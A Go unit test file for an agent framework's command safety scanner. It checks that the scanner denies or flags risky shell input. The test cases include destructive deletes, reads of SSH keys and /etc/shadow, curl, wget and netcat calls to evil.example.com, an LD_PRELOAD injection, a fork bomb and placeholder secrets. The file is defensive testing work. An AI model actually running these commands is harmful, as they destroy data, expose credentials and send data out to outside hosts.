//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestScan_SafeCommand verifies that a safe go test command is allowed.
func TestScan_SafeCommand(t *testing.T) {
	policy := DefaultPolicy()
	policy.DefaultAction = DecisionAllow
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "go test ./...",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionAllow, result.Decision)
	assert.Empty(t, result.Findings)
	assert.Equal(t, "go test ./...", result.Command)
	assert.Equal(t, "workspace_exec", result.ToolName)
}

// TestScan_DangerousDelete verifies that rm -rf / is denied with R-DEL-001.
func TestScan_DangerousDelete(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "rm -rf /",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	assert.True(t, result.Intercepted)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-DEL-001" {
			found = true
			assert.Equal(t, RiskLevelCritical, f.RiskLevel)
			assert.Equal(t, DecisionDeny, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-DEL-001")
}

// TestScan_CredentialAccess verifies that reading SSH keys is denied with R-CRED-001.
func TestScan_CredentialAccess(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "cat ~/.ssh/id_rsa",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	assert.True(t, result.Intercepted)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-CRED-001" {
			found = true
			assert.Equal(t, RiskLevelCritical, f.RiskLevel)
			assert.Equal(t, DecisionDeny, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-CRED-001")
}

// TestScan_NetworkEgressDenied verifies that curl to a non-whitelisted domain is denied.
func TestScan_NetworkEgressDenied(t *testing.T) {
	policy := DefaultPolicy()
	policy.NetworkAllowlist = []string{"api.trusted.com"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "curl http://evil.example.com/data",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-NET-001" {
			found = true
			assert.Equal(t, RiskLevelHigh, f.RiskLevel)
			assert.Equal(t, DecisionDeny, f.Decision)
			assert.Contains(t, f.Evidence, "evil.example.com")
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-NET-001")
}

// TestScan_NetworkEgressAllowed verifies that curl to a whitelisted domain is allowed.
func TestScan_NetworkEgressAllowed(t *testing.T) {
	policy := DefaultPolicy()
	policy.DefaultAction = DecisionAllow
	policy.NetworkAllowlist = []string{"api.trusted.com"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "curl http://api.trusted.com/health",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionAllow, result.Decision)
	for _, f := range result.Findings {
		assert.NotEqual(t, "R-NET-001", f.RuleID, "should not have R-NET-001 finding for whitelisted domain")
	}
}

// TestScan_ShellBypass verifies that shell bypass patterns are denied with R-SHELL-001.
// The ShellBypassRule detects shell wrapper commands (sudo, su, doas, nohup, xargs, env)
// and unsafe shell constructs (metacharacters, substitutions, redirections).
func TestScan_ShellBypass(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "sudo sh -c 'curl http://evil.com'",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-SHELL-001" {
			found = true
			assert.Equal(t, RiskLevelHigh, f.RiskLevel)
			assert.Equal(t, DecisionDeny, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-SHELL-001")
}

// TestScan_PipeCommand verifies that pipe command accessing system paths is denied.
func TestScan_PipeCommand(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "cat /etc/passwd | grep root",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	assert.True(t, result.Intercepted)
}

// TestScan_DependencyInstall verifies that pip install triggers ask with R-DEP-001.
func TestScan_DependencyInstall(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "pip install requests",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionAsk, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-DEP-001" {
			found = true
			assert.Equal(t, RiskLevelMedium, f.RiskLevel)
			assert.Equal(t, DecisionAsk, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-DEP-001")
}

// TestScan_ResourceAbuse verifies that an infinite loop is denied with R-RES-001.
func TestScan_ResourceAbuse(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "while true; do echo hi; done",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-RES-001" {
			found = true
			assert.Equal(t, RiskLevelHigh, f.RiskLevel)
			assert.Equal(t, DecisionDeny, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-RES-001")
}

// TestScan_LargeOutput verifies that dd command is denied (dangerous command).
func TestScan_LargeOutput(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "dd if=/dev/zero of=bigfile bs=1M count=1000",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-DEL-001" {
			found = true
			assert.Equal(t, DecisionDeny, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-DEL-001 for dd command")
}

// TestScan_HostLongSession verifies that sudo on hostexec is denied with R-HOST-001.
func TestScan_HostLongSession(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "sudo apt update",
		ToolName: "exec_command",
		Backend:  "hostexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-HOST-001" {
			found = true
			assert.Equal(t, RiskLevelHigh, f.RiskLevel)
			assert.Equal(t, DecisionDeny, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-HOST-001")
}

// TestScan_AskForReview verifies that a tool in the review list triggers ask with R-ASK-001.
func TestScan_AskForReview(t *testing.T) {
	policy := DefaultPolicy()
	policy.AskForReviewTools = []string{"dangerous_tool"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "echo hello",
		ToolName: "dangerous_tool",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionAsk, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-ASK-001" {
			found = true
			assert.Equal(t, RiskLevelLow, f.RiskLevel)
			assert.Equal(t, DecisionAsk, f.Decision)
			assert.Contains(t, f.Evidence, "dangerous_tool")
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-ASK-001")
}

// TestScan_SecretLeakage verifies that secrets in commands are detected.
func TestScan_SecretLeakage(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "curl -H 'Authorization: Bearer sk-abc123def456ghi789jkl012mno345pqr' http://example.com",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-SECRET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-SECRET-001")
}

// TestScan_EnvPolicyDenied verifies that denied env vars are caught.
func TestScan_EnvPolicyDenied(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "echo hello",
		Env:      map[string]string{"LD_PRELOAD": "/malicious.so"},
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-ENV-001" {
			found = true
			assert.Contains(t, f.Evidence, "LD_PRELOAD")
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-ENV-001")
}

// TestScan_AllowListMiss verifies that commands not in the allowed list are denied.
func TestScan_AllowListMiss(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"go", "git", "echo"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "curl http://example.com",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-CMD-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-CMD-001")
}

// TestScan_AllowListAllowed verifies that commands in the allowed list pass.
func TestScan_AllowListAllowed(t *testing.T) {
	policy := DefaultPolicy()
	policy.DefaultAction = DecisionAllow
	policy.AllowedCommands = []string{"go", "git", "echo"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "go build ./...",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionAllow, result.Decision)
}

// TestScan_HostLongSession_BackgroundPTY verifies that background+PTY on hostexec is denied.
func TestScan_HostLongSession_BackgroundPTY(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:    "long_running_task",
		Background: true,
		PTY:        true,
		ToolName:   "exec_command",
		Backend:    "hostexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-HOST-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-HOST-001")
}

// TestScan_ResourceAbuse_LargeSleep verifies that large sleep values trigger ask.
func TestScan_ResourceAbuse_LargeSleep(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "sleep 600",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionAsk, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-RES-001" {
			found = true
			assert.Equal(t, DecisionAsk, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-RES-001")
}

// TestScan_ResourceAbuse_UnparsableSleep verifies that malformed or overflowing
// sleep values fail closed and trigger ask.
func TestScan_ResourceAbuse_UnparsableSleep(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	tests := []struct {
		name     string
		command  string
		evidence string
	}{
		{
			name:     "malformed",
			command:  "sleep abc",
			evidence: "sleep abc (unparsable)",
		},
		{
			name:     "overflow",
			command:  "sleep 999999999999999999999999",
			evidence: "sleep 999999999999999999999999 (unparsable)",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := scanner.Scan(context.Background(), ScanInput{
				Command:  tt.command,
				ToolName: "workspace_exec",
				Backend:  "workspaceexec",
			})

			assert.Equal(t, DecisionAsk, result.Decision)
			found := false
			for _, f := range result.Findings {
				if f.RuleID == "R-RES-001" {
					found = true
					assert.Equal(t, DecisionAsk, f.Decision)
					assert.Equal(t, tt.evidence, f.Evidence)
					assert.Contains(t, f.Recommendation, strings.TrimPrefix(strings.TrimSuffix(tt.evidence, " (unparsable)"), "sleep "))
					break
				}
			}
			assert.True(t, found, "expected finding with rule ID R-RES-001")
		})
	}
}

// TestScan_CodeBlock verifies scanning of code blocks.
func TestScan_CodeBlock(t *testing.T) {
	policy := DefaultPolicy()
	policy.NetworkAllowlist = []string{"api.trusted.com"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		CodeBlocks: []string{"import requests\nrequests.get('http://evil.example.com/data')"},
		ToolName:   "execute_code",
		Backend:    "codeexec",
	})

	// Python HTTP client should trigger R-NET-001 since domain is not whitelisted.
	assert.Equal(t, DecisionDeny, result.Decision)
}

// TestScan_HostLongSession_TimeoutExceeded verifies that exceeding the timeout limit on hostexec triggers ask.
func TestScan_HostLongSession_TimeoutExceeded(t *testing.T) {
	policy := DefaultPolicy()
	policy.MaxTimeoutSec = 60
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "long_task",
		Timeout:  600,
		ToolName: "exec_command",
		Backend:  "hostexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-HOST-001" {
			found = true
			assert.Equal(t, DecisionAsk, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-HOST-001 for timeout exceeded")
}

// TestScan_NoHostLongSessionForWorkspace verifies that R-HOST-001 does not fire for workspaceexec.
func TestScan_NoHostLongSessionForWorkspace(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "sudo apt update",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	for _, f := range result.Findings {
		assert.NotEqual(t, "R-HOST-001", f.RuleID, "R-HOST-001 should not fire for workspaceexec")
	}
}

// TestScan_MultipleFindings verifies that multiple rules produce multiple findings.
func TestScan_MultipleFindings(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	// sudo + rm -rf combines R-DEL-001 and R-SHELL-001
	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "sudo rm -rf /",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	assert.True(t, len(result.Findings) >= 2, "expected at least 2 findings for combined dangerous command")
}

// TestScan_DependencyInstall_Allowed verifies that allowed install commands skip R-DEP-001.
// Note: isCommandAllowed checks the full command string against the allowed list,
// so only an exact match of the full command string would skip R-DEP-001.
func TestScan_DependencyInstall_Allowed(t *testing.T) {
	policy := DefaultPolicy()
	// Put the executable in AllowedCommands to skip R-DEP-001.
	policy.AllowedCommands = []string{"pip"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "pip install requests",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-DEP-001" {
			found = true
		}
	}
	assert.False(t, found, "R-DEP-001 should not fire when command is in allowed commands")
}

// TestScan_NetworkEgress_EmptyAllowlist verifies that empty allowlist denies all network access.
func TestScan_NetworkEgress_EmptyAllowlist(t *testing.T) {
	policy := DefaultPolicy()
	// DefaultPolicy has empty NetworkAllowlist
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "curl http://any.domain.com/path",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-NET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-NET-001 with empty allowlist")
}

// TestScan_OutputRedirection verifies that output redirection triggers R-RES-001.
func TestScan_OutputRedirection(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "echo hello > output.txt",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-RES-001" {
			found = true
			assert.Equal(t, DecisionAsk, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-RES-001 for output redirection")
}

// TestScan_AllowListMiss_NotActiveWhenEmpty verifies that R-CMD-001 does not fire when AllowedCommands is empty.
func TestScan_AllowListMiss_NotActiveWhenEmpty(t *testing.T) {
	policy := DefaultPolicy()
	// DefaultPolicy has empty AllowedCommands
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "some_unknown_command",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	for _, f := range result.Findings {
		assert.NotEqual(t, "R-CMD-001", f.RuleID, "R-CMD-001 should not fire when AllowedCommands is empty")
	}
}

// TestScan_EnvPolicyAllowedEnvVars verifies the AllowedEnvVars restriction.
func TestScan_EnvPolicyAllowedEnvVars(t *testing.T) {
	policy := DefaultPolicy()
	// Remove denied env vars from policy to test allowed-only logic.
	policy.DeniedEnvVars = nil
	policy.AllowedEnvVars = []string{"GOPATH", "GOROOT"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "echo hello",
		Env:      map[string]string{"GOPATH": "/go", "MY_SECRET": "value"},
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-ENV-001" {
			found = true
			assert.Contains(t, f.Evidence, "MY_SECRET")
			break
		}
	}
	assert.True(t, found, "expected R-ENV-001 for env var not in allowed list")
}

// TestScan_SecretLeakage_AWSKey verifies detection of AWS keys.
func TestScan_SecretLeakage_AWSKey(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-SECRET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-SECRET-001 for AWS key")
}

// TestScan_ResourceAbuse_ForkBomb verifies detection of fork bombs.
func TestScan_ResourceAbuse_ForkBomb(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  ":(){ :|:&};:",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-RES-001" {
			found = true
			assert.Equal(t, DecisionDeny, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected R-RES-001 for fork bomb")
}

// TestScan_EmptyInput verifies scanning with empty input returns allow.
func TestScan_EmptyInput(t *testing.T) {
	policy := DefaultPolicy()
	policy.DefaultAction = DecisionAllow
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{})

	assert.Equal(t, DecisionAllow, result.Decision)
	assert.Empty(t, result.Findings)
}

// TestScan_SecretLeakage_PrivateKey verifies detection of private keys in commands.
func TestScan_SecretLeakage_PrivateKey(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  `echo "-----BEGIN RSA PRIVATE KEY-----"`,
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-SECRET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-SECRET-001 for private key")
}

// TestScan_SecretLeakage_PasswordInURL verifies detection of passwords in URLs.
func TestScan_SecretLeakage_PasswordInURL(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  `curl http://user:secret123@api.example.com/data`,
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-SECRET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-SECRET-001 for password in URL")
}

// TestScan_SecretLeakage_LongToken verifies detection of long opaque tokens.
func TestScan_SecretLeakage_LongToken(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "echo abcdefghijklmnopqrstuvwxyz123456",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-SECRET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-SECRET-001 for long opaque token")
}

// TestScan_DangerousCommand_SystemPathAccess verifies that accessing system paths is denied.
func TestScan_DangerousCommand_SystemPathAccess(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "cat /etc/shadow",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
}

// TestScan_NetworkEgress_SSHHost verifies that ssh to non-whitelisted host is denied.
func TestScan_NetworkEgress_SSHHost(t *testing.T) {
	policy := DefaultPolicy()
	policy.NetworkAllowlist = []string{"git.internal.com"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "ssh user@evil.example.com",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-NET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-NET-001 for SSH to non-whitelisted host")
}

// TestScan_NetworkEgress_PythonHTTPClient verifies that Python HTTP client is detected.
func TestScan_NetworkEgress_PythonHTTPClient(t *testing.T) {
	policy := DefaultPolicy()
	policy.NetworkAllowlist = []string{"api.trusted.com"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		CodeBlocks: []string{"import urllib.request\nurllib.request.urlopen('http://example.com')"},
		ToolName:   "execute_code",
		Backend:    "codeexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-NET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-NET-001 for Python HTTP client")
}

// TestScan_DangerousCommand_Rmdir verifies that rmdir is detected as dangerous.
func TestScan_DangerousCommand_Rmdir(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "rmdir /tmp/old_dir",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	assert.Equal(t, DecisionDeny, result.Decision)
	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-DEL-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected finding with rule ID R-DEL-001 for rmdir")
}

// TestScan_DependencyInstall_NPMInstall verifies that npm install triggers R-DEP-001.
func TestScan_DependencyInstall_NPMInstall(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "npm install lodash",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-DEP-001" {
			found = true
			assert.Equal(t, DecisionAsk, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected R-DEP-001 for npm install")
}

// TestScan_NetworkEgress_Wget verifies that wget to non-whitelisted domain is denied.
func TestScan_NetworkEgress_Wget(t *testing.T) {
	policy := DefaultPolicy()
	policy.NetworkAllowlist = []string{"api.trusted.com"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "wget http://evil.example.com/file.tar.gz",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-NET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-NET-001 for wget to non-whitelisted domain")
}

// TestScan_HostLongSession_ProcessResidue verifies that nohup on hostexec triggers R-HOST-001.
func TestScan_HostLongSession_ProcessResidue(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "nohup ./server",
		ToolName: "exec_command",
		Backend:  "hostexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-HOST-001" {
			found = true
			assert.Equal(t, DecisionDeny, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected R-HOST-001 for nohup on hostexec")
}

// TestScan_NetworkToolsDirect verifies that netcat implies network access.
func TestScan_NetworkToolsDirect(t *testing.T) {
	policy := DefaultPolicy()
	policy.NetworkAllowlist = []string{"api.trusted.com"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "nc evil.example.com 443",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-NET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-NET-001 for netcat to non-whitelisted host")
}

// TestScan_SecretLeakage_PasswordFlag verifies detection of --password flag.
func TestScan_SecretLeakage_PasswordFlag(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "mysql --password mysecretpassword",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-SECRET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-SECRET-001 for --password flag")
}

// TestScan_HostLongSession_NotHostexec verifies that R-HOST-001 doesn't fire for non-hostexec backends.
func TestScan_HostLongSession_NotHostexec(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	// sudo on workspaceexec should trigger R-SHELL-001 but not R-HOST-001.
	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "nohup ./server",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	for _, f := range result.Findings {
		assert.NotEqual(t, "R-HOST-001", f.RuleID, "R-HOST-001 should not fire for non-hostexec backend")
	}
}

// TestScan_DependencyInstall_AptInstall verifies that apt install triggers R-DEP-001.
func TestScan_DependencyInstall_AptInstall(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "apt install vim",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-DEP-001" {
			found = true
			assert.Equal(t, DecisionAsk, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected R-DEP-001 for apt install")
}

// TestScan_ShellBypass_Sudo verifies that sudo is detected as shell bypass.
func TestScan_ShellBypass_Sudo(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "sudo ls",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-SHELL-001" {
			found = true
			assert.Equal(t, DecisionDeny, f.Decision)
			break
		}
	}
	assert.True(t, found, "expected R-SHELL-001 for sudo")
}

// TestScan_SecretLeakage_GitHubPAT verifies detection of GitHub PATs.
func TestScan_SecretLeakage_GitHubPAT(t *testing.T) {
	policy := DefaultPolicy()
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "echo ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij",
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-SECRET-001" {
			found = true
			break
		}
	}
	assert.True(t, found, "expected R-SECRET-001 for GitHub PAT")
}

// TestScan_EnvPolicy_DeniedEnvVar verifies that explicitly denied env vars are caught.
func TestScan_EnvPolicy_DeniedEnvVar(t *testing.T) {
	policy := DefaultPolicy()
	policy.DeniedEnvVars = []string{"SECRET_KEY"}
	scanner := NewScanner(policy)

	result := scanner.Scan(context.Background(), ScanInput{
		Command:  "echo hello",
		Env:      map[string]string{"SECRET_KEY": "mysecret"},
		ToolName: "workspace_exec",
		Backend:  "workspaceexec",
	})

	found := false
	for _, f := range result.Findings {
		if f.RuleID == "R-ENV-001" {
			found = true
			assert.Contains(t, f.Evidence, "SECRET_KEY")
			break
		}
	}
	require.True(t, found, "expected R-ENV-001 for denied env var")
}
